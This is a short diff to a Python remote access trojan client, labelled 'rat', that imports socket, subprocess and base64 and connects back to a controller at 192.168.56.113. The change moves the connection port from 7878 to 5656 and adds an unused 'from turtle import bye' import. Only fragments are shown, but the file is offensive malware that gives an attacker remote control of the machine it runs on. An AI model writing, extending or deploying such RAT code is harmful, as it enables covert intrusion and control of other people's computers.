@@ -3,6 +3,7 @@
 import socket, subprocess, os, platform
 import base64
 import json
+from turtle import bye
 
 class CLIENT:
     
@@ -90,7 +91,7 @@ class CLIENT:
                 file.close()
 
                 
-rat = CLIENT('192.168.56.113', 7878)
+rat = CLIENT('192.168.56.113', 5656)
 
 if __name__ == '__main__':
     rat.connection()
